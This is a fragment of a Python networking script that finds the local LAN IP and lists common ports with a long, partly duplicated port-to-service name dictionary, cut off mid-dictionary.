
import sys
import socket
import os
from platform import system as system_name
from os import system as system_call
import datetime
#END OF DATA TRANS
END_OF_STRING = "[XX]END OF STRING[XX]"
END_OF_FILE = "[XX]END OF DATA[XX]"
if os.name != "nt":
    import fcntl
    import struct
    def get_interface_ip(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
                s.fileno(),
                0x8915,  # SIOCGIFADDR
                struct.pack('256s', bytes(ifname[:15], 'utf-8'))
                # Python 2.7: remove the second argument for the bytes call
            )[20:24])

def get_lan_ip():
    ip = socket.gethostbyname(socket.gethostname())
    if ip.startswith("127.") and os.name != "nt":
        interfaces = ["eth0","eth1","eth2","wlan0","wlan1","wifi0","ath0","ath1","ppp0"]
        for ifname in interfaces:
            try:
                ip = get_interface_ip(ifname)
                break;
            except IOError:
                pass
    return ip
common_port_list = [1,5,7,9,11,13,17,18,19,20,21,22,23,25,37,39,42,43,49,50,53,63,67,68,69,70,71,72,73,73,79,80,88,95,101,102,105,107,109,110,111,113,115,117,119,123,137,138,139
,143,161,162,163,164,174,177,178,179,191,194,199,201,202,204,206,209,210,213,220,245,347,363,369,370,372,389,427,434,435,443,444,445,464,468,487,488,496,500,535,538
,546,547,554,563,565,587,610,611,612,631,636,674,694,749,750,751,752,754,760,765,767,873,992,993,994,995,1080,1109,1236,1300,1433,1434,1494,1512,1524,1525,1645,1646,1649,1701,1718,1719,1720,1758
,1759,1789,1812,1813,1911,1985,1986,1997,2049,2053,2102,2103,2104,2105,2401,2430,2430,2431,2600,2601,2602,2603,2604,2605,2606,2809,3130,3306,3346,4011,4321,4444,5002,5308,5999,6000,7000,7001,7002,
7003,7004,7005,7006,7007,7008,7009,9876,10080,11371,11720,13720,13721,13722,13724,13782,13783,22273,26000,26208,33434]

def service(port):
    service_list = {1:'tcpmux', 2:'compressnet', 3:'compressnet', 4:'sfs', 5:'rje', 7:'echo', 8:'trojan - Ping Attack',
9:'discard', 11:'systat', 13:'daytime', 15:'netstat / trojan[B2]', 17:'quotd', 18:'msp', 19:'chargen',
20:'ftp-data', 21:'ftp', 22:'ssh', 23:'telnet', 24:"priv-mail / trojan[BO2K]", 25:'smtp', 26:'rsftp', 27:'nsw-fe',
28:'trojan[amanda]', 29:'msg-icp', 30:'trojan[Agent 40421]', 40421:'trojan[Agent 40421]', 31:'msg-auth',
33:'dsp[Display Support Protocol]', 34:'remote[Remote File]', 35:'priv-printer', 37:'time', 38:'rap[Resource Location Protocol]',
41:'graphics', 42:'nameserver', 43:'whois', 44:'mpm-flags', 45:'mpm', 46:'mpm-snd', 47:'ni-ftp', 48:'auditd',
49:'bbn-login', 50:'re-mail.ck', 51:'la-maint', 52:'xns-time', 53:'domain', 54:'xns-ch', 55:'isi-gl',
56:'xns-auth', 57:'priv-terminal / MTP', 58:'xns-mail', 59:'priv-file / Backdoor.Sdbot.AJ', 61:'NI MAIL', 62:'ACA Services',
63:'whois++', 64:'covia', 65:'tacacs-ds', 66:'Oracle Sql *NET', 67:'bootps', 68:'bootpc', 69:'tftp', 70:'gopher',
71:'netrjs-1', 72:'netrjs-2',  73:'netrjs-3', 74:'netrjs-4', 75:'priv-dial', 76:'deos', 77:'priv-RJE', 78:'vettcp',
79:'finger', 80:'http', 81:'hosts2-ns', 82:'xfer', 83:'mit-ml-dev', 84:'Common Trace Facility', 85:'mit-ml-dev',
86:'mfcobol', 87:'priv-terminal link', 88:'kerberos', 89:'su-mit-tg', 90:'dnsix', 91:'mit-dov', 92:'Network printing protocol',
93:'device control protocol', 94:'objcall', 95:'supdup', 96:'dixie', 97:'swift-rvf', 98:'tacnews', 99:'metagram',
100:'newacct', 101:'hostname', 102:'iso-tsap',  103:'gppitnp', 104:'acr-nema', 105:'csnet-ns', 106:'3com-tsmux',
107:'rtelnet', 108:'SNA gateway',  109:'pop2', 110:'pop3', 111:'sunrpc', 112:'mcidas', 113:'auth', 114:'audionews',
115:'sftp', 116:'ansanotify', 117:'uucp-path', 118:'sqlserv', 119:'nntp', 120:'cfdptkt', 121:'erpc', 122:'smakynet',
123:'ntp', 124:'ansatrader', 125:'locus-map', 126:'unitary', 127:'locus-con', 128:'gss-xlicen', 129:'pwdgen',
130:'cisco-fna', 131:'cisco-tna', 132:'cisco-sys', 133:'statsrv', 134:'ingres-net', 135:'loc-srv', 136:'profile',
137:'netbios-ns', 138:'netbios-dgm', 139:'netbios-ssn',  140:'emfis-data', 141:'emfis-cntl', 142:'bl-idm', 143:'imap2',
144:'news', 145:'uaac', 146:'iso-tp0', 147:'iso-ip', 148:'cronus', 149:'aed-512', 150:'SQL-NET', 151:'hems',
152:'bftp', 153:'sgmp', 154:'netsc-prod', 155:'netsc-dev', 156:'SQL servic', 157:'knet-cmp', 158:'pcmail-srv', 159:'nss-routing',
160:'sgmp-traps', 161:'snmp', 162:'snmptrap', 163:'cmip-man', 164:'cmip-agent', 165:'xns-courier', 166:'s-net',
167:'namp', 168:'rsvd', 169:'send', 171:'multiplex', 170:'print-srv', 172:'cl/1', 173:'xyplex-mux', 174:'mailq',
175:'vmnet',  176:'genrad-mux', 177:'xdmcp', 178:'nextstep', 179:'bgp', 180:'ris', 181:'unify', 182:'audit SITP',
183:'ocbinder', 184:'ocserver', 185:'remote-kis', 186:'KIS protocol', 187:'ACI', 188:'mumps', 189:"qft",
190:'gacp', 191:'prospero', 192:'osu-nms', 193:'srmp', 194:'irc', 195:'dn6-nlm-aud', 196:'dn6-smm-red', 197:'dls',
198:'dls-mon', 199:'smux', 200:'src', 201:'at-rtmp', 202:'at-nbp', 203:'at-3', 204:'at-echo', 205:'at-5',
206:'at-zis', 207:'at-7', 208:'at-8', 209:'tam', 210:'z39.50', 211:'914c/g', 212:'anet', 213:'ipx', 214:'vmpwscs',
215:'softpc', 216:'atls', 217:'dbase', 218:'mpp', 219:'uarps', 220:'imap3', 221:'fln-spx',222:'rsh-spx',
223:'cdc', 243:'sur-meas', 245:'link', 246:'dsp3270', 344:'pdap', 345:'pawserv', 346:'zserv', 347:'fatserv',
348:'cis-sgwp', 371:'clearcase', 372:'ulistserv', 373:'legent-1', 374:'legent-2', 375:'hassle', 376:'nip',
377:'tnETOS', 378:'dsETOS', 379:'is99c', 380:'is99s',381:'hp-collector', 382:'hp-managed-node',383:'hp-alarm-mgr',
384:'arns', 385:'ibm-app', 386:'asa', 387:'aurp', 388:'unidata-ldm', 389:'ldap', 390:'uis', 391:'synotics-relay',
392:'synotics-broker', 393:'dis', 394:'embl-ndt', 395:'netcp', 396:'netware-ip', 397:'mptn', 398:'kryptolan',
399:'iso-tsap-c2', 400:'work-sol', 401:'ups', 402:'genie', 403:'decap', 404:'nced', 405:'ncld', 406:'imsp',
407:'timbuktu', 408:'prm-sm', 409:'prm-nm', 410:'decladebug', 411:'rmt', 412:'synoptics-trap', 413:'smsp',
414:'infoseek', 415:'bnet', 416:'silverplatter', 417:'onmux', 418:'hyper-g', 419:'ariel1', 420:'smpte',
421:'ariel2', 422:'ariel3', 423:'opc-job-start', 424:'opc-job-track', 425:'icad-el', 426:'smartsdp',
427:'svrloc', 428:'ocs_cmu', 429:'ocs_amu', 430:'utmpsd', 431:'utmpcd', 432:'iasd', 433:'nnsp',
434:'mobileip-agent', 435:'mobilip-mn', 436:'dna-cml', 437:'dna-cml', 438:'dsfgw', 439:'dasp', 440:'sgcp',
441:'decvms-sysmgt', 442:'cvc_hostd', 443:'https', 444:'snpp', 445:'microsoft-ds', 446:'ddm-rdb', 447:'ddm-dfm',
448:'ddm-byte', 449:'as-servermap',  450:'tserver', 451:'sfs-smp-net', 452:'sfs-config', 453:'creativeserver',
454:'contentserver', 455:'creativepartnr', 456:'macon-tcp', 457:'scohelp', 458:'appleqtc', 460:'skronk',
459:'ampr-rcmd', 461:'datasurfsrv', 462:'datasurfsrvsec', 463:'alpes', 464:'kpasswd', 465:'ssmtp', 466:'digital-vrc',
467:'mylex-mapd', 468:'photuris', 469:'rcp', 470:'scx-proxy', 471:'mondex', 472:'ljk-login', 473:'hybrid-pop',
474:'tn-tl-w1', 475:'tcpnethaspsrv', 512:'exec', 513:'login', 514:'cmd', 515:'printer', 517:'talk', 518:'ntalk',
519:'utime', 520:'efs', 525:'timed', 530:'courier', 531:'conference', 532:'netnews', 533:'netwall', 539:'apertus-ldp',
540:'uucp', 541:'uucp-rlogin', 543:'klogin', 544:'kshell', 545:'appleqtcsrvr', 546:'dhcp-client', 547:'dhcp-server',
550:'new-rwho', 551:'cybercash', 552:'deviceshare', 553:'pirp', 555:'dsf', 556:'remotefs', 557:'openvms-sysipc',
558:'sdnskmp', 559:'teedtap', 560:'rmonitor', 561:'monitor', 562:'chshell', 563:'snews', 564:'9pfs', 565:'whoami',
566:'streettalk', 567:'banyan-rpc', 568:'ms-shuttle', 569:'ms-rome', 570:'meter[demon]', 571:'meter[udemon]',
572:'sonar', 573:'banyan-vip', 600:'ipcserver', 607:'nqs', 606:'urm', 608:'shift-uft', 609:'npmp-trap',
610:'npmp-local', 611:'npmp-gui', 634:'ginad', 666:'mdqs / doom', 704:'elcsd', 709:'entrustmanager',
729:'netviewdm1', 730:'netviewdm2', 731:'netviewdm3', 741:'netgw', 742:'netrcs', 744:'flexlm', 747:'fujitsu-dev',
748:'ris-cm', 749:'kerberos-adm', 750:'rfile', 751:'pump', 752:'qrh', 753:'rrh', 754:'tell', 758:'nlogin',
759:'con', 760:'ns', 761:'rxe', 762:'quotad', 763:'cycleserv', 764:'omserv', 765:'webster', 767:'phonebook',
769:'vid', 770:'cadlock', 771:'rtip', 772:'cycleserv2', 773:'submit', 774:'rpasswd', 775:'entomb',
776:'wpages', 780:'wpgs', 786:'concert', 800:'mdbs_daemon', 801:'device', 888:'accessbuilder', 996:'vsinet',
997:'maitrd', 998:'busboy', 999:'garcon / puprouter', 1000:'cadlock',1:'tcpmux',1:'tcpmux',2:'compressnet',
3:'compressnet',5:'rje',7:'echo',9:'discard',11:'systat',13:'daytime',15:'netstat',17:'qotd',18:'msp',19:'chargen',
20:'ftp-data',21:'ftp',22:'ssh',23:'telnet',24:'priv-mail',25:'smtp',27:'nsw-fe',29:'msg-icp',31:'msg-auth',33:'dsp',
35:'priv-print',37:'time',38:'rap',39:'rlp',41:'graphics',42:'nameserver',43:'whois',44:'mpm-flags',45:'mpm',46:'mpm-snd',
47:'ni-ftp',48:'auditd',49:'tacacs',50:'re-mail-ck',51:'la-maint',52:'xns-time',53:'domain',54:'xns-ch',55:'isi-gl',56:'xns-auth',
57:'priv-term',58:'xns-mail',59:'priv-file',61:'ni-mail',62:'acas',63:'via-ftp',64:'covia',65:'tacacs-ds',66:'sql*net',67:'dhcps',
68:'dhcpc',69:'tftp',70:'gopher',71:'netrjs-1',72:'netrjs-2',73:'netrjs-3',74:'netrjs-4',75:'priv-dial',76:'deos',
77:'priv-rje',78:'vettcp',78:'vettcp',79:'finger',80:'http',81:'hosts2-ns',82:'xfer',83:'mit-ml-dev',84:'ctf',85:'mit-ml-dev',
86:'mfcobol',87:'priv-term-l',88:'kerberos-sec',89:'su-mit-tg',90:'dnsix',91:'mit-dov',92:'npp',93:'dcp',94:'objcall',95:'supdup',
96:'dixie',97:'swift-rvf',98:'linuxconf',99:'metagram',100:'newacct',101:'hostname',102:'iso-tsap',103:'gppitnp',104:'acr-nema',105:'csnet-ns',
106:'pop3pw',107:'rtelnet',108:'snagas',109:'pop2',110:'pop3',111:'rpcbind',112:'mcidas',113:'auth',114:'audionews',115:'sftp',116:'ansanotify',
117:'uucp-path',118:'sqlserv',119:'nntp',120:'cfdptkt',121:'erpc',122:'smakynet',123:'ntp',124:'ansatrader',125:'locus-map',
126:'unitary',127:'locus-con',128:'gss-xlicen',129:'pwdgen',130:'cisco-fna',131:'cisco-tna',132:'cisco-sys',133:'statsrv',
134:'ingres-net',135:'msrpc',136:'profile',137:'netbios-ns',138:'netbios-dgm',139:'netbios-ssn',140:'emfis-data',
141:'emfis-cntl',142:'bl-idm',143:'imap',144:'news',145:'uaac',146:'iso-tp0',147:'iso-ip',148:'cronus',149:'aed-512',
150:'sql-net',151:'hems',152:'bftp',153:'sgmp',154:'netsc-prod',155:'netsc-dev',156:'sqlsrv',157:'knet-cmp',
158:'pcmail-srv',159:'nss-routing',160:'sgmp-traps',161:'snmp',162:'snmptrap',163:'cmip-man',164:'cmip-agent',
165:'xns-courier',166:'s-net',167:'namp',168:'rsvd',169:'send',170:'print-srv',171:'multiplex',172:'cl-1',
173:'xyplex-mux',174:'mailq',175:'vmnet',176:'genrad-mux',177:'xdmcp',178:'nextstep',179:'bgp',180:'ris',
181:'unify',182:'audit',183:'ocbinder',184:'ocserver',185:'remote-kis',186:'kis',187:'aci',188:'mumps',
189:'qft',190:'gacp',191:'prospero',192:'osu-nms',193:'srmp',194:'irc',195:'dn6-nlm-aud',196:'dn6-smm-red',
197:'dls',198:'dls-mon',199:'smux',200:'src',201:'at-rtmp',202:'at-nbp',203:'at-3',204:'at-echo',205:'at-5',
206:'at-zis',207:'at-7',208:'at-8',209:'tam',210:'z39.50',211:'914c-g',212:'anet',213:'ipx',214:'vmpwscs',
215:'softpc',216:'atls',217:'dbase',218:'mpp',219:'uarps',220:'imap3',221:'fln-spx',222:'rsh-spx',223:'cdc',
242:'direct',243:'sur-meas',244:'dayna',245:'link',246:'dsp3270',247:'subntbcst_tftp',248:'bhfhs',256:'FW1-secureremote',
257:'FW1-mc-fwmodule',258:'Fw1-mc-gui',259:'esro-gen',260:'openport',261:'nsiiops',262:'arcisdms',263:'hdap',264:'bgmp',
265:'maybeFW1',280:'http-mgmt',281:'personal-link',282:'cableport-ax',308:'novastorbakcup',309:'entrusttime',310:'bhmds',
311:'asip-webadmin',312:'vslmp',313:'magenta-logic',314:'opalis-robot',315:'dpsi',316:'decauth',317:'zannet',
321:'pip',344:'pdap',345:'pawserv',346:'zserv',347:'fatserv',348:'csi-sgwp',349:'mftp',350:'matip-type-a',351:'matip-type-b',
352:'dtag-ste-sb',353:'ndsauth',354:'bh611',355:'datex-asn',356:'cloanto-net-1',357:'bhevent',358:'shrinkwrap',359:'tenebris_nts',
360:'scoi2odialog',361:'semantix',362:'srssend',363:'rsvp_tunnel',364:'aurora-cmgr',365:'dtk',366:'odmr',367:'mortgageware',
368:'qbikgdp',369:'rpc2portmap',370:'codaauth2',371:'clearcase',372:'ulistserv',373:'legent-1',374:'legent-2',375:'hassle',
376:'nip',377:'tnETOS',378:'dsETOS',379:'is99c',380:'is99s',381:'hp-collector',382:'hp-managed-node',383:'hp-alarm-mgr',
384:'arns',385:'ibm-app',386:'asa',387:'aurp',388:'unidata-ldm',389:'ldap',390:'uis',391:'synotics-relay',392:'synotics-broker',
393:'dis',394:'embl-ndt',395:'netcp',395:'netcp',396:'netware-ip',397:'mptn',398:'kryptolan',399:'iso-tsap-c2',400:'work-sol',
401:'ups',402:'genie',403:'decap',404:'nced',405:'ncld',406:'imsp',407:'timbuktu',408:'prm-sm',409:'prm-nm',410:'decladebug',
411:'rmt',412:'synoptics-trap',413:'smsp',414:'infoseek',415:'bnet',416:'silverplatter',417:'onmux',418:'hyper-g',419:'ariel1',
420:'smpte',421:'ariel2',422:'ariel3',423:'opc-job-start',424:'opc-job-track',425:'icad-el',426:'smartsdp',427:'svrloc',428:'ocs_cmu',
429:'ocs_amu',430:'utmpsd',431:'utmpcd',432:'iasd',433:'nnsp',434:'mobileip-agent',435:'mobilip-mn',436:'dna-cml',437:'comscm',
438:'dsfgw',439:'dasp',440:'sgcp',441:'decvms-sysmgt',442:'cvc_hostd',443:'https',444:'snpp',445:'microsoft-ds',446:'ddm-rdb',
447:'ddm-dfm',448:'ddm-ssl',449:'as-servermap',450:'tserver',451:'sfs-smp-net',452:'sfs-config',453:'creativeserver',454:'contentserver',
455:'creativepartnr',456:'macon-tcp',457:'scohelp',458:'appleqtc',459:'ampr-rcmd',460:'skronk',461:'datasurfsrv',462:'datasurfsrvsec',
463:'alpes',464:'kpasswd5',465:'smtps',466:'digital-vrc',467:'mylex-mapd',468:'photuris',469:'rcp',470:'scx-proxy',471:'mondex',
472:'ljk-login',473:'hybrid-pop',474:'tn-tl-w1',475:'tcpnethaspsrv',475:'tcpnethaspsrv',476:'tn-tl-fd1',477:'ss7ns',478:'spsc',
479:'iafserver',480:'loadsrv',481:'dvs',482:'bgs-nsi',483:'ulpnet',484:'integra-sme',485:'powerburst',486:'sstats',487:'saft',
488:'gss-http',489:'nest-protocol',490:'micom-pfs',491:'go-login',492:'ticf-1',493:'ticf-2',494:'pov-ray',495:'intecourier',496:'pim-rp-disc',
497:'dantz',498:'siam',499:'iso-ill',500:'isakmp',501:'stmf',502:'asa-appl-proto',503:'intrinsa',504:'citadel',505:'mailbox-lm',506:'ohimsrv',507:'crs',508:'xvttp',509:'snare',510:'fcp',511:'passgo',512:'exec',513:'login',514:'shell',515:'printer',516:'videotex',517:'talk',518:'ntalk',519:'utime',520:'efs',521:'ripng',522:'ulp',523:'ibm-db2',524:'ncp',525:'timed',526:'tempo',527:'stx',528:'custix',529:'irc-serv',530:'courier',531:'conference',532:'netnews',533:'netwall',534:'mm-admin',535:'iiop',536:'opalis-rdv',537:'nmsp',538:'gdomap',539:'apertus-ldp',540:'uucp',541:'uucp-rlogin',542:'commerce',543:'klogin',544:'kshell',545:'ekshell',546:'dhcpv6-client',547:'dhcpv6-server',548:'afpovertcp',548:'afpovertcp',549:'idfp',550:'new-rwho',551:'cybercash',552:'deviceshare',553:'pirp',554:'rtsp',555:'dsf',556:'remotefs',557:'openvms-sysipc',558:'sdnskmp',559:'teedtap',560:'rmonitor',561:'monitor',562:'chshell',563:'snews',564:'9pfs',565:'whoami',566:'streettalk',567:'banyan-rpc',568:'ms-shuttle',569:'ms-rome',570:'meter',571:'umeter',572:'sonar',573:'banyan-vip',574:'ftp-agent',575:'vemmi',576:'ipcd',577:'vnas',578:'ipdd',579:'decbsrv',580:'sntp-heartbeat',581:'bdp',582:'scc-security',583:'philips-vc',584:'keyserver',585:'imap4-ssl',586:'password-chg',587:'submission',588:'cal',589:'eyelink',590:'tns-cml',591:'http-alt',592:'eudora-set',593:'http-rpc-epmap',594:'tpip',595:'cab-protocol',596:'smsd',597:'ptcnameservice',598:'sco-websrvrmg3',599:'acp',600:'ipcserver',603:'mnotes',606:'urm',607:'nqs',608:'sift-uft',609:'npmp-trap',610:'npmp-local',611:'npmp-gui',617:'sco-dtmgr',628:'qmqp',631:'ipp',634:'ginad',636:'ldapssl',637:'lanserver',660:'mac-srvr-admin',666:'doom',674:'acap',691:'resvc',
704:'elcsd',706:'silc',709:'entrustmanager',709:'entrustmanager',723:'omfs',729:'netviewdm1',730:'netviewdm2',730:'netviewdm2',731:'netviewdm3',731:'netviewdm3',740:'netcp',740:'netcp',741:'netgw',742:'netrcs',744:'flexlm',747:'fujitsu-dev',748:'ris-cm',749:'kerberos-adm',750:'kerberos',751:'kerberos_master',752:'qrh',753:'rrh',754:'krb_prop',758:'nlogin',759:'con',760:'krbupdate',761:'kpasswd',762:'quotad',763:'cycleserv',764:'omserv',765:'webster',767:'phonebook',769:'vid',770:'cadlock',771:'rtip',772:'cycleserv2',773:'submit',774:'rpasswd',775:'entomb',776:'wpages',780:'wpgs',781:'hp-collector',782:'hp-managed-node',783:'spamassassin',786:'concert',799:'controlit',800:'mdbs_daemon',801:'device',808:'ccproxy-http',871:'supfilesrv',873:'rsync',888:'accessbuilder',898:'sun-manageconsole',989:'ftps-data',901:'samba-swat',902:'iss-realsecure-sensor',903:'iss-console-mgr',950:'oftep-rpc',953:'rndc',975:'securenetpro-sensor',990:'ftps',992:'telnets',993:'imaps',994:'ircs',995:'pop3s',996:'xtreelic',997:'maitrd',998:'busboy',999:'garcon',1000:'cadlock',1002:'windows-icfw',1008:'ufsd',1023:'netvenuechat',1024:'kdm',1025:'NFS-or-IIS',1026:'LSA-or-nterm',1027:'IIS',1029:'ms-lsa',1030:'iad1',1031:'iad2',1032:'iad3',1033:'netinfo',1040:'netsaint',1043:'boinc-client',1050:'java-or-OTGfileshare',1058:'nim',1059:'nimreg',1067:'instl_boots',1068:'instl_bootc',1076:'sns_credit',1080:'socks',1083:'ansoft-lm-1',1084:'ansoft-lm-2',1103:'xaudio',1109:'kpop',1110:'nfsd-status',1112:'msql',1127:'supfiledbg',1139:'cce3x',1155:'nfa',1158:'lsnr',1178:'skkserv',1212:'lupa',1214:'fasttrack',1220:'quicktime',1222:'nerv',1234:'hotline',1241:'nessus',1248:'hermes',1337:'waste',1346:'alta-ana-lm',1347:'bbn-mmc',1348:'bbn-mmx',1349:'sbook',1350:'editbench',1351:'equationbuilder',1352:'lotusnotes',1353:'relief',1354:'rightbrain',1355:'intuitive-edge',
1356:'cuillamartin',1357:'pegboard',1358:'connlcli',1359:'ftsrv',1360:'mimer',1361:'linx',1362:'timeflies',1363:'ndm-requester',1364:'ndm-server',1365:'adapt-sna',1366:'netware-csp',1367:'dcs',1368:'screencast',1369:'gv-us',1370:'us-gv',1371:'fc-cli',1372:'fc-ser',1373:'chromagrafx',1374:'molly',1375:'bytex',1376:'ibm-pps',1377:'cichlid',1378:'elan',1379:'dbreporter',1380:'telesis-licman',1381:'apple-licman',1383:'gwha',1384:'os-licman',1385:'atex_elmd',1386:'checksum',1387:'cadsi-lm',1388:'objective-dbc',1389:'iclpv-dm',1390:'iclpv-sc',1391:'iclpv-sas',1392:'iclpv-pm',1393:'iclpv-nls',1394:'iclpv-nlc',1395:'iclpv-wsm',1396:'dvl-activemail',1397:'audio-activmail',1398:'video-activmail',1399:'cadkey-licman',1400:'cadkey-tablet',1401:'goldleaf-licman',1402:'prm-sm-np',1403:'prm-nm-np',1404:'igi-lm',1405:'ibm-res',1406:'netlabs-lm',1407:'dbsa-lm',1408:'sophia-lm',1409:'here-lm',1410:'hiq',1411:'af',1412:'innosys',1413:'innosys-acl',1414:'ibm-mqseries',1415:'dbstar',1416:'novell-lu6.2',1417:'timbuktu-srv1',1418:'timbuktu-srv2',1419:'timbuktu-srv3',1420:'timbuktu-srv4',1421:'gandalf-lm',1422:'autodesk-lm',1423:'essbase',1424:'hybrid',1425:'zion-lm',1426:'sas-1',1427:'mloadd',1428:'informatik-lm',1429:'nms',1430:'tpdu',1431:'rgtp',1432:'blueberry-lm',1433:'ms-sql-s',1434:'ms-sql-m',1435:'ibm-cics',1436:'sas-2',1437:'tabula',1438:'eicon-server',1439:'eicon-x25',1440:'eicon-slp',1441:'cadis-1',1442:'cadis-2',1443:'ies-lm',1444:'marcam-lm',1445:'proxima-lm',1446:'ora-lm',1447:'apri-lm',1448:'oc-lm',1449:'peport',1450:'dwf',1451:'infoman',1452:'gtegsc-lm',1453:'genie-lm',1454:'interhdl_elmd',1455:'esl-lm',1456:'dca',1457:'valisys-lm',1458:'nrcabq-lm',1459:'proshare1',1460:'proshare2',1461:'ibm_wrless_lan',1462:'world-lm',1463:'nucleus',1464:'msl_lmd',1465:'pipes',1466:'oceansoft-lm',1467:'csdmbase',1468:'csdm',1469:'aal-lm',
1470:'uaiact',1471:'csdmbase',1472:'csdm',1473:'openmath',1474:'telefinder',1475:'taligent-lm',1476:'clvm-cfg',1477:'ms-sna-server',1478:'ms-sna-base',1479:'dberegister',1480:'pacerforum',1481:'airs',1482:'miteksys-lm',1483:'afs',1484:'confluent',1485:'lansource',1486:'nms_topo_serv',1487:'localinfosrvr',1488:'docstor',1489:'dmdocbroker',1490:'insitu-conf',1491:'anynetgateway',1492:'stone-design-1',1493:'netmap_lm',1494:'citrix-ica',1495:'cvc',1496:'liberty-lm',1497:'rfx-lm',1498:'watcom-sql',1499:'fhc',1500:'vlsi-lm',1501:'sas-3',1502:'shivadiscovery',1503:'imtc-mcs',1504:'evb-elm',1505:'funkproxy',1506:'utcd',1507:'symplex',1508:'diagmond',1509:'robcad-lm',1510:'mvx-lm',1511:'3l-l1',1512:'wins',1513:'fujitsu-dtc',1514:'fujitsu-dtcns',1515:'ifor-protocol',1516:'vpad',1517:'vpac',1518:'vpvd',1519:'vpvc',1520:'atm-zip-office',1521:'oracle',1522:'rna-lm',1523:'cichild-lm',1524:'ingreslock',1525:'orasrv',1526:'pdap-np',1527:'tlisrv',1528:'mciautoreg',1529:'support',1530:'rap-service',1531:'rap-listen',1532:'miroconnect',1533:'virtual-places',1534:'micromuse-lm',1535:'ampr-info',1536:'ampr-inter',1537:'sdsc-lm',1538:'3ds-lm',1539:'intellistor-lm',1540:'rds',1541:'rds2',1542:'gridgen-elmd',1543:'simba-cs',1544:'aspeclmd',1545:'vistium-share',1546:'abbaccuray',1547:'laplink',1548:'axon-lm',1549:'shivahose',1550:'3m-image-lm',1551:'hecmtl-db',1552:'pciarray',1600:'issd',1650:'nkd',1651:'shiva_confsrvr',1652:'xnmp',1661:'netview-aix-1',1662:'netview-aix-2',1663:'netview-aix-3',1664:'netview-aix-4',1665:'netview-aix-5',1666:'netview-aix-6',1667:'netview-aix-7',1668:'netview-aix-8',1669:'netview-aix-9',1670:'netview-aix-10',1671:'netview-aix-11',1672:'netview-aix-12',1680:'CarbonCopy',1720:'H.323/Q.931',1723:'pptp',1755:'wms',1761:'landesk-rc',1762:'landesk-rc',1763:'landesk-rc',1764:'landesk-rc',1827:'pcm',1900:'UPnP',1935:'rtmp',
1984:'bigbrother',1986:'licensedaemon',1987:'tr-rsrb-p1',1988:'tr-rsrb-p2',1989:'tr-rsrb-p3',1990:'stun-p1',1991:'stun-p2',1992:'stun-p3',1993:'snmp-tcp-port',1993:'snmp-tcp-port',1994:'stun-port',1995:'perf-port',1996:'tr-rsrb-port',1997:'gdp-port',1998:'x25-svc-port',1999:'tcp-id-port',1999:'tcp-id-port',2000:'callbook',2001:'dc',2002:'globe',2003:'cfingerd',2004:'mailbox',2005:'deslogin',2006:'invokator',2007:'dectalk',2008:'conf',2009:'news',2010:'search',2011:'raid-cc',2012:'ttyinfo',2013:'raid-am',2014:'troff',2015:'cypress',2016:'bootserver',2017:'cypress-stat',2018:'terminaldb',2019:'whosockami',2020:'xinupageserver',2021:'servexec',2022:'down',2023:'xinuexpansion3',2024:'xinuexpansion4',2025:'ellpack',2026:'scrabble',2027:'shadowserver',2028:'submitserver',2030:'device2',2032:'blackboard',2033:'glogger',2034:'scoremgr',2035:'imsldoc',2038:'objectmanager',2040:'lam',2041:'interbase',2042:'isis',2043:'isis-bcast',2044:'rimsl',2045:'cdfunc',2046:'sdfunc',2047:'dls',2048:'dls-monitor',2049:'nfs',2064:'dnet-keyproxy',2053:'knetd',2065:'dlsrpn',2067:'dlswpn',2068:'advocentkvm',2105:'eklogin',2106:'ekshell',2108:'rkinit',2111:'kx',2112:'kip',2120:'kauth',2121:'ccproxy-ftp',2201:'ats',2232:'ivs-video',2241:'ivsd',2301:'compaqdiag',2307:'pehelp',2401:'cvspserver',2430:'venus',2431:'venus-se',2432:'codasrv',2433:'codasrv-se',2500:'rtsserv',2501:'rtsclient',2564:'hp-3000-telnet',2600:'zebrasrv',2601:'zebra',2602:'ripd',2603:'ripngd',2604:'ospfd',2605:'bgpd',2627:'webster',2628:'dict',2638:'sybase',2766:'listen',2784:'www-dev',2809:'corbaloc',2903:'extensisportfolio',2998:'iss-realsec',3000:'ppp',3001:'nessusd',3005:'deslogin',3006:'deslogind',3049:'cfs',3052:'PowerChute',3064:'dnet-tstproxy',3086:'sj3',3128:'squid-http',3141:'vmodem',3264:'ccmail',3268:'globalcatLDAP',
3269:'globalcatLDAPssl',3292:'meetingmaker',3306:'mysql',3333:'dec-notes',3372:'msdtc',3389:'ms-term-serv',3421:'bmap',3455:'prsvp',3456:'vat',3457:'vat-control',3462:'track',3531:'peerenabler',3632:'distccd',3689:'rendezvous',3900:'udt_os',3984:'mapper-nodemgr',3985:'mapper-mapethd',3986:'mapper-ws_ethd',3999:'remoteanything',4000:'remoteanything',4008:'netcheque',4045:'lockd',4125:'rww',4132:'nuts_dem',4133:'nuts_bootp',4144:'wincim',4224:'xtell',4321:'rwhois',4333:'msql',4343:'unicall',4444:'krb524',4480:'proxy-plus',4500:'sae-urn',4557:'fax',4559:'hylafax',4660:'mosmig',4672:'rfa',4827:'squid-htcp',4899:'radmin',4987:'maybeveritas',4998:'maybeveritas',5000:'UPnP',5001:'commplex-link',5002:'rfe',5003:'filemaker',5010:'telelpathstart',5011:'telelpathattack',5050:'mmcc',5100:'admd',5101:'admdog',5102:'admeng',5145:'rmonitor_secure',5060:'sip',5190:'aol',5191:'aol-1',5192:'aol-2',5193:'aol-3',5232:'sgi-dgl',5236:'padl2sim',5300:'hacl-hb',5301:'hacl-gs',5302:'hacl-cfg',5303:'hacl-probe',5304:'hacl-local',5305:'hacl-test',5308:'cfengine',5400:'pcduo-old',5405:'pcduo',5490:'connect-proxy',5432:'postgres',5510:'secureidprop',5520:'sdlog',5530:'sdserv',5540:'sdreport',5550:'sdadmind',5555:'freeciv',5560:'isqlplus',5631:'pcanywheredata',5632:'pcanywherestat',5680:'canna',5679:'activesync',5713:'proshareaudio',5714:'prosharevideo',5715:'prosharedata',5716:'prosharerequest',5717:'prosharenotify',5800:'vnc-http',5801:'vnc-http-1',5802:'vnc-http-2',5803:'vnc-http-3',5900:'vnc',5901:'vnc-1',5902:'vnc-2',5903:'vnc-3',5977:'ncd-pref-tcp',5978:'ncd-diag-tcp',5979:'ncd-conf-tcp',5997:'ncd-pref',5998:'ncd-diag',5999:'ncd-conf',
